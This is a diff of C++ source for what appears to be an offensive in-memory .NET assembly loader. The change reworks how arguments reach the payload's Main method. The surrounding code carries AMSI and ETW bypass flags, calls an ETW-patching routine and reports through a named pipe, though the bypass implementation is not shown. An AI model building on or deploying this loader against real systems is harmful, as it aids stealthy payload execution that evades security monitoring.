@@ -45,9 +45,8 @@ struct Metadata
 	unsigned int assemblySize;
 	unsigned char amsiBypass;
 	unsigned char etwBypass;
-	unsigned char signature;
 };
-DWORD METADATA_SIZE = 23;
+DWORD METADATA_SIZE = 22;
 
 int executeSharp(LPVOID lpPayload)
 {
@@ -66,6 +65,7 @@ int executeSharp(LPVOID lpPayload)
 	VARIANT retVal;
 	VARIANT obj;
 	SAFEARRAY* psaStaticMethodArgs;
+	SAFEARRAY* psaEntryPointParameters;
 	VARIANT vtPsa;
 
 	char* pipeName = NULL;
@@ -169,7 +169,7 @@ int executeSharp(LPVOID lpPayload)
 		goto Cleanup;
 	}
 
-	//Etw bypass
+	// Etw bypass
 	if (metadata.etwBypass)
 	{
 		int ptcResult = PatchEtw(pipe);
@@ -290,16 +290,45 @@ int executeSharp(LPVOID lpPayload)
 		goto Cleanup;
 	}
 
+	// Let's check the number of parameters: must be either the 0-arg Main(), or a 1-arg Main(string[])
+	pMethodInfo->GetParameters(&psaEntryPointParameters);
+	hr = SafeArrayLock(psaEntryPointParameters);
+	if (!SUCCEEDED(hr))
+	{
+		ReportErrorThroughPipe(pipe, "Failed to lock param array w/hr 0x%08lx\n", hr);
+		goto Cleanup;
+	}
+	long uBound, lBound;
+	SafeArrayGetLBound(psaEntryPointParameters, 1, &lBound);
+	SafeArrayGetUBound(psaEntryPointParameters, 1, &uBound);
+	long numArgs = uBound - lBound + 1;
+	hr = SafeArrayUnlock(psaEntryPointParameters);
+	if (!SUCCEEDED(hr))
+	{
+		ReportErrorThroughPipe(pipe, "Failed to unlock param array w/hr 0x%08lx\n", hr);
+		goto Cleanup;
+	}
+
 	ZeroMemory(&retVal, sizeof(VARIANT));
 	ZeroMemory(&obj, sizeof(VARIANT));
 
 	obj.vt = VT_NULL;
 	vtPsa.vt = (VT_ARRAY | VT_BSTR);
 
-	// Managing parameters
-	if (metadata.signature == '\x02')
+	switch (numArgs)
 	{
-		// If we have at least 1 parameter set cEleemnt to 1
+	case 0:
+		if (metadata.argsSize > 1) // There is always a Null byte at least, so "1" in size means "0 args"
+		{
+			ReportErrorThroughPipe(pipe, "Assembly takes no arguments, but some were provided\n");
+			goto Cleanup;
+		}
+		// If no parameters set cElement to 0
+		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
+		break;
+	case 1:
+	{
+		// If we have at least 1 parameter set cElement to 1
 		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
 
 		LPWSTR* szArglist;
@@ -331,13 +360,14 @@ int executeSharp(LPVOID lpPayload)
 
 		long iEventCdIdx(0);
 		hr = SafeArrayPutElement(psaStaticMethodArgs, &iEventCdIdx, &vtPsa);
+		break;
 	}
-	else
-	{
-		// if no parameters set cEleemnt to 0
-		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
+	default:
+		ReportErrorThroughPipe(pipe, "Unexpected argument length: %d\n", numArgs);
+		goto Cleanup;
 	}
-	// Assembly execution
+
+	//Assembly execution
 	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);
 	if (FAILED(hr))
 	{
